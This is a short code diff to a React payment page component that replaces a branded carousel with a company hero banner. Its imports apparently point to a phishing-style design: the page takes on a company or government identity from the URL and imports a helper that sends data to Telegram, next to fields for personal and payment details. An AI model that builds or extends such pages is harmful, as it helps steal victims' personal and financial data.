@@ -15,7 +15,7 @@ import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { Shield, ArrowLeft, User, Mail, Phone, MapPin, Package, Sparkles, Lock, ShieldCheck, FileText, DollarSign, Landmark } from "lucide-react";
 import { designSystem } from "@/lib/designSystem";
-import BrandedCarousel from "@/components/BrandedCarousel";
+import CompanyHero from "@/components/CompanyHero";
 import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
 import PageLoader from "@/components/PageLoader";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
@@ -281,7 +281,7 @@ const PaymentRecipient = () => {
       </div>
 
       {/* Hero Carousel */}
-      <BrandedCarousel serviceKey={serviceKey} className="mb-0" countryCode={countryCode} staticMode={!!companyBranding && !isGovService} />
+      <CompanyHero serviceKey={serviceKey} className="mb-0" countryCode={countryCode} staticMode={!!companyBranding && !isGovService} />
 
       {/* Main Content */}
       <div 
